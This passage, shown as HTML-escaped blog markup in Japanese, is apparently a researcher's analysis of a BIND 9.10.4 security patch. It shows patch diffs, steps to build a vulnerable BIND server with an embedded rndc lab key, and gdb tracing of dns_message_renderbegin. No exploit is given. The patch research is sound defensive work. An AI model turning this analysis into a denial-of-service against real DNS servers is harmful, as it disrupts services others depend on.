       &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dns_rdataset_towire&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdataset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;owner_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;n&quot;&gt;cctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;countp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reserved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;新たに追加されたrenderset関数は予約量によりスペースを縮小する処理が入っている。この予約量によりスペースを縮小する処理はセキュリティパッチに複数箇所追加されている。&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gu&quot;&gt;@@ -1728,7 +1728,7 @@
&lt;/span&gt;        if (r.length &amp;lt; DNS_MESSAGE_HEADERLEN)
                return (ISC_R_NOSPACE);

&lt;span class=&quot;gd&quot;&gt;-       if (r.length &amp;lt; msg-&amp;gt;reserved)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       if (r.length - DNS_MESSAGE_HEADERLEN &amp;lt; msg-&amp;gt;reserved)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gu&quot;&gt;@@ -1913,6 +1934,8 @@
&lt;/span&gt;        /*
         * Shrink the space in the buffer by the reserved amount.
         */
&lt;span class=&quot;gi&quot;&gt;+       if (msg-&amp;gt;buffer-&amp;gt;length - msg-&amp;gt;buffer-&amp;gt;used &amp;lt; msg-&amp;gt;reserved)
+               return (ISC_R_NOSPACE);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;section-6&quot;&gt;脆弱な環境の構築&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;bind-9.10.4-P2をビルドする&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# apt-get install libssl-dev
# wget https://ftp.isc.org/isc/bind9/9.10.4-P2/bind-9.10.4-P2.tar.gz
# ./configure --prefix=/usr --sysconfdir=/etc/ --enable-threads --localstatedir=/var/state --with-libtool --with-openssl
# make
# make intsall
# ldconfig -v 
# groupadd named
# useradd -d /var/named -g named -s /bin/false named
# vigr (daemonグループにnamedを追加する)
# chown root:daemon /var/run
# chmod 775 /var/run
# mkdir -p /var/named/pz
# chown -R named:named /var/named
# chmod -R 755 /var/named
# wget -O /var/named/db.root http://www.internic.net/domain/named.root
# wget -O /var/named/root.hints http://www.internic.net/domain/named.root
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;/var/named/pz/127.0.0ファイルを作成&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat &amp;gt; /var/named/pz/127.0.0
$TTL 1D

@           1D IN SOA   localhost. root.localhost. (
                    42      ; serial (d. adams)
                    3H      ; refresh
                    15M     ; retry
                    1W      ; expiry
                    1D )        ; minimum

            1D IN NS    localhost.
1           1D IN PTR   localhost.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;/var/named/pz/127.0.0のシンボリックリンクをvar/named/pz/192.168.1に貼る&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ln -s /var/named/pz/127.0.0 /var/named/pz/192.168.1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;リゾルバをbindに向ける&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# echo &quot;nameserver 127.0.0.1&quot; &amp;gt; /etc/resolv.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;rncd関連の設定&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# rndc-confgen -a -b 512 -u named -r /dev/urandom
# cat /etc/rndc.key
key &quot;rndc-key&quot; {
        algorithm hmac-md5;
        secret &quot;3sauHWKuPD9SS7yAATsWWzZYW19+xbo7mprXuoan4PXrsTxaPFcEls5Do2cw03K46Ugr9Ha2+HexHUQPpvws6Q==&quot;;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;rndc.confの作成&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;rndc-keyディレクティブの値はrndc.keyの値と合わせる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat &amp;gt; /etc/rndc.conf
   // this file is used by the rndc utility
        options {
        // what host should rndc attempt to control by default
            default-server localhost;
        // and what key should it use to communicate with named
            default-key &quot;rndc-key&quot;;
        };

        server localhost {
        // always use this key with this host
            key &quot;rndc-key&quot;;
        };

        key &quot;rndc-key&quot; {
            algorithm hmac-md5;
            secret &quot;3sauHWKuPD9SS7yAATsWWzZYW19+xbo7mprXuoan4PXrsTxaPFcEls5Do2cw03K46Ugr9Ha2+HexHUQPpvws6Q==&quot;;
        };

        // secret was generated by running mmencode on command line
        // and then entering a secret phrase
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;etc/named.confの作成　&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;rndc-keyディレクティブの値はrndc.keyの値と合わせる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat &amp;gt; /etc/named.conf

   // This is a configuration file for named (from BIND 9.0 or later).
        // It would normally be installed as /etc/named.conf.
        //
        // Changed to match secure example from LASG 5/17/00
        // Changed to match Linux Journal example 9/17/00
        // Added new &quot;view' sections to stop fingerprinting of Bind 9.x per
        // Bugtraq 1/31/00
        // Added rndc key stuff per DNS &amp;amp; Bind (Rev. 4) Chapter 11
        // added use-id-pool and more comments based on above chapter

             options {
            // Directory where bind should create files if
            // not explicitly stated
            directory &quot;/var/named&quot;;

            // whom do we allow to do zone tranfers
            allow-transfer { 192.168.10.0/24; };

            // new in Bind 9.x to allow RFC1886 -&amp;gt; RFC2874 conversion
            // to support IPv6
            // allow-v6-synthesis { 192.168.1.10; };
            // OBSOLETED in 9.3.0 + !!

            // tell Bind to check the names in zone files
            // since it no longer does this by default
            // (unimplemented 9.3.0+)
            check-names master warn;

            // sets the size of something or other to 20Mb ;)
            datasize 20M;

            // sets the size of the journal to 5Mb
            max-journal-size 5M;

            // Bind 9.x doesn't recognize this yet :(
            // deallocate-on-exit no;

            // where should Bind put a dump of its cache
            // if told to dump it
            dump-file &quot;named_dump.db&quot;;

            // how often should bind check for new
            // interfaces toi listen on. we turn
            // this off by setting it to 0
            interface-interval 0;

            // specify what interfaces/ips to listen on
            // as the default is all of them
            listen-on { 192.168.10.102; };

            // define a mximum size of cached records
            // new in Bind 9.x
            max-cache-size 20M;

            // where to right stats of memory usage
            // Bind 9.x doesn't recognize this yet :(
            memstatistics-file &quot;named.memstats&quot;;

            // where to put out pid file
            // absolute path since we don't want
            // it in /var/named
            pid-file &quot;/var/run/named.pid&quot;;

            // force Bind to use port 53 for its
            // network operation to other DNS
            // servers (Bind 9 uses high ports
            // by default). Makes firewalling easier
            query-source address * port 53;
            transfer-source * port 53;
            notify-source * port 53;

            // where to dump Bind server stats
            statistics-file &quot;named.stats&quot;;

            // force Bind to be &quot;more&quot; random in assiging
            // message ids
            use-id-pool yes;

            // If the chaos view below doesn't work
            // for some reason, still give out a bogus
            // answer for Bind version requests
            version &quot;This is not the port you're looking for.&quot;;

            // keep stats on a zone basis
            zone-statistics yes;
             };

             controls { 
            // this allows rndc to be used from the localhost
            // to talk to bind on the loopback interface
            // using the key defined as 'rndc-key'
            inet 127.0.0.1 allow { localhost; } keys { rndc-key; };
             };

             // the rest of the key configuration is in
             // /etc/rndc.conf and the key itself is in
             // /etc/rndc.key
             key &quot;rndc-key&quot; {
            // how was key encoded
            algorithm hmac-md5;
            // what is the pass-phrase for the key
            secret &quot;3sauHWKuPD9SS7yAATsWWzZYW19+xbo7mprXuoan4PXrsTxaPFcEls5Do2cw03K46Ugr9Ha2+HexHUQPpvws6Q==&quot;;
             };

             logging {
            channel named_info {
                // log to syslog instead of a file
                syslog;
                // include the category of the event in the log
                print-category yes;
                // include the severity of the event in the log
                print-severity yes;
                // include the time of the event in the log
                print-time yes;
            };

            // Processing of client requests
            category client { named_info; };

            // named.conf parsing and processing
            category config { named_info; };

            // Messages relating to internal memory structures
            category database { named_info; };

            // This is the default for any category not specifically defined
            category default { named_info; };

            // The catch-all. Anything without a category of its own
            category general { named_info; };

            // Uncomment if you dont want to know about lame server.
            // Leave commented and it defaults to the
            // value of default above
            // category lame-servers { null; };

            // The NOTIFY protocol
            category notify { named_info; };

            // Network operations
            category network { named_info; };

            // DNS resolution like recursive lookups, etc..
            category resolver { named_info; };

            // Approval and denial of requests
            category security { named_info; };

            // Dynamic updates
            category update { named_info; };

            // Queries. Duh.
            category queries { named_info; };

            // Zone transfers received
            category xfer-in { named_info; };

            // Zone transfers sent
            category xfer-out { named_info; };
            };

            // this is where we define different versions
            // of our zones based on where the client is
            // coming from.
            // the first view that matches a client is
            // the one that gets used, so order can be
            // important
            view &quot;external-chaos&quot; chaos {
                // you could use 'any' or even 'localnets' here
                // instead of specifying each IP range
                // however, it should be noted that 'localnets'
                // means ANY network Bind is directly connected
                // to which might include your ISP
                match-clients { 192.168.1.0/24; 127/8; };
                recursion no;
                zone &quot;.&quot; {
                    type hint;
                    // this causes a null response to queries
                    // about the Bind version
                    file &quot;/dev/null&quot;;
                };
            };
    
            view &quot;external&quot; {
                // you could use 'any' or even 'localnets' here
                // instead of specifying each IP range
                // however, it should be noted that 'localnets'
                // means ANY network Bind is directly connected
                // to which might include your ISP
                match-clients { 192.168.1.0/24; 127/8; };
                zone &quot;.&quot; {
                    type hint;
                    file &quot;root.hints&quot;;
                };
            };
    
            view &quot;external-127&quot; {
                // you could use 'any' or even 'localnets' here
                // instead of specifying each IP range
                // however, it should be noted that 'localnets'
                // means ANY network Bind is directly connected
                // to which might include your ISP
                match-clients { 192.168.1.0/24; 127/8; };
                zone &quot;0.0.127.in-addr.arpa&quot; {
                    type master;
                    file &quot;pz/127.0.0&quot;;
                    allow-update {
                        none;
                    };
                };
            };
    
            view &quot;external-192&quot; {
                // you could use 'any' or even 'localnets' here
                // instead of specifying each IP range
                // however, it should be noted that 'localnets'
                // means ANY network Bind is directly connected
                // to which might include your ISP
                match-clients { 192.168.1.0/24; 127/8; };
                zone &quot;1.168.192.in-addr.arpa&quot; {
                    type master;
                    file &quot;pz/192.168.1&quot;;
                    allow-update {
                        none;
                    };
                };
            };
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;namedの起動&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# /usr/sbin/named -u named
# netstat -lnp | grep named
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      6075/named
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      6075/named
tcp6       0      0 :::53                   :::*                    LISTEN      6075/named
udp        0      0 0.0.0.0:53              0.0.0.0:*                           6075/named
udp        0      0 127.0.0.1:53            0.0.0.0:*                           6075/named
udp6       0      0 :::53                   :::*                                6075/named
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;namedのテスト&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# dig @127.0.0.1 -x 8.8.8.8 +short
google-public-dns-a.google.com.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;section-7&quot;&gt;問題箇所を通るパケットを調査する&lt;/h2&gt;

&lt;p&gt;以下の修正はdns_message_renderbegin関数内で行われている。まずdns_message_renderbegin関数内に入るオペレーションを探る。&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff -ur bind-9.10.4-P2/lib/dns/message.c bind-9.10.4-P3/lib/dns/message.c
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- bind-9.10.4-P2/lib/dns/message.c    2016-07-14 08:58:03.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ bind-9.10.4-P3/lib/dns/message.c    2016-09-14 10:23:44.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -1728,7 +1728,7 @@
&lt;/span&gt;        if (r.length &amp;lt; DNS_MESSAGE_HEADERLEN)
                return (ISC_R_NOSPACE);

&lt;span class=&quot;gd&quot;&gt;-       if (r.length &amp;lt; msg-&amp;gt;reserved)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       if (r.length - DNS_MESSAGE_HEADERLEN &amp;lt; msg-&amp;gt;reserved)
&lt;/span&gt;                return (ISC_R_NOSPACE);

        /*
&lt;span class=&quot;gu&quot;&gt;@@ -1869,8 +1869,29 @@
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;dnsmessagerenderbegin&quot;&gt;dns_message_renderbeginに着目した調査&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;isc_result_t&lt;/span&gt;                                                            
&lt;span class=&quot;nf&quot;&gt;dns_message_renderbegin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dns_message_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dns_compress_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;       
                        &lt;span class=&quot;n&quot;&gt;isc_buffer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                           
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;                                                                       
        &lt;span class=&quot;n&quot;&gt;isc_region_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                 
                                                                        
        &lt;span class=&quot;n&quot;&gt;REQUIRE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DNS_MESSAGE_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;                                
        &lt;span class=&quot;n&quot;&gt;REQUIRE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                        
        &lt;span class=&quot;n&quot;&gt;REQUIRE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                   
        &lt;span class=&quot;n&quot;&gt;REQUIRE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from_to_wire&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNS_MESSAGE_INTENTRENDER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         
                                                                        
        &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               
                                                                        
        &lt;span class=&quot;cm&quot;&gt;/*                                                              
         * Erase the contents of this buffer.                           
         */&lt;/span&gt;                                                             
        &lt;span class=&quot;n&quot;&gt;isc_buffer_clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                       
                                                                        
        &lt;span class=&quot;cm&quot;&gt;/*                                                              
         * Make certain there is enough for at least the header in this 
         * buffer.                                                      
         */&lt;/span&gt;                                                             
        &lt;span class=&quot;n&quot;&gt;isc_buffer_availableregion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                         
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNS_MESSAGE_HEADERLEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                           
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ISC_R_NOSPACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                 
                                                                        
&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reserved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                   
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNS_MESSAGE_HEADERLEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reserved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ISC_R_NOSPACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                 
                                                                        
        &lt;span class=&quot;cm&quot;&gt;/*                                                              
         * Reserve enough space for the header in this buffer.          
         */&lt;/span&gt;                                                             
        &lt;span class=&quot;n&quot;&gt;isc_buffer_add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNS_MESSAGE_HEADERLEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                  
                                                                        
        &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                           
                                                                        
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ISC_R_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                                         
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;                                                                       
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;r.lengthからDNS_MESSAGE_HEADERLENを引いたものよりmsg-&amp;gt;reservedメンバ変数が小さいならISC_R_NOSPACEを返すように修正されている。ISC_R_NOSPACEを返すことができるならDOSが成立するのかという疑問を調査するため、強制的にISC_R_NOSPACEを返すようにソースを修正してビルドする。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        return (ISC_R_NOSPACE); 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;ビルドした状態でdigコマンドを使用すると以下のようなメッセージを得た。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@scapegoat:/home/kosuke/bind-9.10.2-P2# dig @127.0.0.1 -x 8.8.8.8 +short
dig: dns_message_renderbegin: ran out of space
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;しかしbindが落ちるようなことはなかった。この時どのようなstack traceを辿ったのかを調べる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# gdb -q /usr/sbin/named
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;dns_message_renderbeginの呼び出しを調べる&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;fore groundでnamedを起動させてgdbでデバッグする。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# file /usr/sbin/named
/usr/sbin/named: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dee19b8e2f0725ec245d9223f5123d70b564a72c, not stripped
# gdb -q /usr/sbin/named
Reading symbols from /usr/sbin/named...done.
(gdb) set disassembly-flavor intel
(gdb) b dns_message_renderbegin
Breakpoint 1 at 0x413db0
(gdb) run -u named -f
Starting program: /usr/sbin/named -u named -f
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
[New Thread 0x7ffff5b37700 (LWP 11875)]
[New Thread 0x7ffff5336700 (LWP 11876)]
[New Thread 0x7ffff4b35700 (LWP 11877)]
where
[Switching to Thread 0x7ffff5b37700 (LWP 11875)]

Breakpoint 1, dns_message_renderbegin (msg=0x7fffefbb3010, cctx=0x7ffff5b36850, buffer=0x7fffefbb6078) at message.c:1708
warning: Source file is more recent than executable.
1708    {
(gdb) where
#0  dns_message_renderbegin (msg=0x7fffefbb3010, cctx=0x7ffff5b36850, buffer=0x7fffefbb6078) at message.c:1708
#1  0x00007ffff78d9a40 in resquery_send (query=0x7fffefbb6010) at resolver.c:1977
#2  0x00007ffff78e3d40 in fctx_query (fctx=0x7fffefbaf010, addrinfo=&amp;lt;optimized out&amp;gt;, options=&amp;lt;optimized out&amp;gt;) at resolver.c:1626
#3  0x00007ffff78e40d4 in fctx_try (fctx=0x7fffefbaf010, retrying=isc_boolean_false, badcache=(unknown: 4026045432)) at resolver.c:3392
#4  0x00007ffff78e4830 in fctx_start (task=0x7fffefbb3010, event=0x7fffefbaf0a8) at resolver.c:3737
#5  0x00007ffff6b6fbbf in dispatch (manager=0x7ffff7fae010) at task.c:1122
#6  run (uap=0x7ffff7fae010) at task.c:1294
#7  0x00007ffff67220a4 in start_thread (arg=0x7ffff5b37700) at pthread_create.c:309
#8  0x00007ffff645762d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上記結果は以下のコマンドでパケットを生成させた時のものである。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# dig @127.0.0.1 -x 8.8.8.8 +short
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;resquery_sendにISC_R_NOSPACEが返った時の挙動を調査する&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;resolver.c:6654&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                 if (result == ISC_R_NOSPACE) {    
                                         /*                        
                                          * We can't construct the 
                                          * DNAME target.  Do not  
                                          * try to continue.       
                                          */                       
                                         want_chaining = ISC_FALSE;
                                         POST(want_chaining);      
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;named&quot;&gt;namedの主な動きを理解する&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;bin/named/main.cのmainがエントリポイント&lt;/li&gt;
  &lt;li&gt;main.cのsetup()に移動する&lt;/li&gt;
  &lt;li&gt;main.cのcreate_manegers()に移動する&lt;/li&gt;
  &lt;li&gt;isc_taskmgr_create, isc_timermgr_create, isc_socketmgr_create2でそれぞれスレッドが生成される&lt;/li&gt;
&lt;/ul&gt;

